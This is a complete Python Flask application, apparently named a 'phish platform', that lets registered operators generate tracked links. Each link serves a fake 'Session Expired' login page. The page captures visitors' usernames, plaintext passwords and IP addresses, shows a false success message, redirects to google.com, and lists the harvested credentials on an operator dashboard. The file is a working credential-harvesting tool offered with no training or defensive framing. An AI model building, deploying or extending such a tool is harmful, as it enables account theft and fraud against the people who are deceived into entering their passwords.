# phish_platform.py
import os
import uuid
import sqlite3
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, url_for, session, abort

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'dev-key-change-in-production')

DB_NAME = 'phish_data.db'

# ---------- Database Initialization ----------
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    # Links table (each user can create multiple links)
    c.execute('''CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        link_id TEXT UNIQUE,
        created_at TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    # Submissions table
    c.execute('''CREATE TABLE IF NOT EXISTS submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id TEXT,
        username TEXT,
        password TEXT,
        ip TEXT,
        submitted_at TIMESTAMP,
        FOREIGN KEY (link_id) REFERENCES links (link_id)
    )''')
    conn.commit()
    conn.close()

init_db()

# ---------- HTML Templates ----------
HTML_REGISTER = '''
<!DOCTYPE html>
<html>
<head><title>Register - Phish Platform</title></head>
<body>
<h2>Register</h2>
<form method="post">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Register</button>
</form>
<a href="/login">Already have an account? Login</a>
</body>
</html>
'''

HTML_LOGIN = '''
<!DOCTYPE html>
<html>
<head><title>Login - Phish Platform</title></head>
<body>
<h2>Login</h2>
<form method="post">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
</form>
<a href="/register">Create an account</a>
</body>
</html>
'''

HTML_DASHBOARD = '''
<!DOCTYPE html>
<html>
<head><title>Dashboard</title></head>
<body>
<h2>Welcome, {{ user }}</h2>
<a href="/create_link">+ Create New Phishing Link</a>
<h3>Your Links</h3>
<ul>
{% for link in links %}
    <li>
        <code>{{ request.host_url }}f/{{ link.link_id }}</code> 
        (created: {{ link.created_at }})
        <a href="/submissions/{{ link.link_id }}">View Submissions</a>
    </li>
{% endfor %}
</ul>
<a href="/logout">Logout</a>
</body>
</html>
'''

HTML_CREATE_LINK = '''
<!DOCTYPE html>
<html>
<head><title>Create Link</title></head>
<body>
<h2>Generate New Phishing Link</h2>
<form method="post">
    <button type="submit">Generate New Link</button>
</form>
<a href="/dashboard">Back to Dashboard</a>
</body>
</html>
'''

HTML_PHISH_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Login Required</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
        input { width: 100%; padding: 8px; margin: 10px 0; }
        button { background: #007bff; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Session Expired</h2>
        <p>Please login again to continue</p>
        <form method="POST">
            <input type="text" name="username" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
'''

HTML_SUBMISSIONS = '''
<!DOCTYPE html>
<html>
<head><title>Submissions for Link</title></head>
<body>
<h2>Submissions for Link: {{ link_id }}</h2>
<table border="1" cellpadding="5">
    <tr><th>Username/Email</th><th>Password</th><th>IP Address</th><th>Submitted At</th></tr>
    {% for sub in subs %}
    <tr>
        <td>{{ sub.username }}</td>
        <td>{{ sub.password }}</td>
        <td>{{ sub.ip }}</td>
        <td>{{ sub.submitted_at }}</td>
    </tr>
    {% endfor %}
</table>
<a href="/dashboard">Back to Dashboard</a>
</body>
</html>
'''

# ---------- Routes ----------
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        try:
            c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
            conn.commit()
            conn.close()
            return redirect('/login')
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists. <a href='/register'>Try again</a>"
    return render_template_string(HTML_REGISTER)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT id FROM users WHERE username=? AND password=?", (username, password))
        user = c.fetchone()
        conn.close()
        if user:
            session['user_id'] = user[0]
            session['username'] = username
            return redirect('/dashboard')
        else:
            return "Invalid credentials. <a href='/login'>Try again</a>"
    return render_template_string(HTML_LOGIN)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/login')
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT link_id, created_at FROM links WHERE user_id=?", (session['user_id'],))
    links = [{'link_id': row[0], 'created_at': row[1]} for row in c.fetchall()]
    conn.close()
    return render_template_string(HTML_DASHBOARD, user=session['username'], links=links)

@app.route('/create_link', methods=['GET', 'POST'])
def create_link():
    if 'user_id' not in session:
        return redirect('/login')
    if request.method == 'POST':
        link_id = str(uuid.uuid4())[:8]  # Unique 8-char ID
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO links (user_id, link_id, created_at) VALUES (?, ?, ?)",
                  (session['user_id'], link_id, datetime.now()))
        conn.commit()
        conn.close()
        return redirect('/dashboard')
    return render_template_string(HTML_CREATE_LINK)

@app.route('/f/<link_id>', methods=['GET', 'POST'])
def phish_page(link_id):
    # Check if link exists
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
    link_owner = c.fetchone()
    if not link_owner:
        conn.close()
        return "Invalid link", 404
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        c.execute("INSERT INTO submissions (link_id, username, password, ip, submitted_at) VALUES (?,?,?,?,?)",
                  (link_id, username, password, ip, datetime.now()))
        conn.commit()
        conn.close()
        # Show a success message and redirect to a legitimate site
        return "<h2>Login Successful! Redirecting...</h2><script>setTimeout(()=>{window.location.href='https://google.com'},2000);</script>"
    conn.close()
    return render_template_string(HTML_PHISH_PAGE)

@app.route('/submissions/<link_id>')
def view_submissions(link_id):
    if 'user_id' not in session:
        return redirect('/login')
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    # Verify that the link belongs to the logged-in user
    c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
    owner = c.fetchone()
    if not owner or owner[0] != session['user_id']:
        conn.close()
        return "Unauthorized", 403
    c.execute("SELECT username, password, ip, submitted_at FROM submissions WHERE link_id=? ORDER BY submitted_at DESC", (link_id,))
    subs = [{'username': row[0], 'password': row[1], 'ip': row[2], 'submitted_at': row[3]} for row in c.fetchall()]
    conn.close()
    return render_template_string(HTML_SUBMISSIONS, link_id=link_id, subs=subs)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)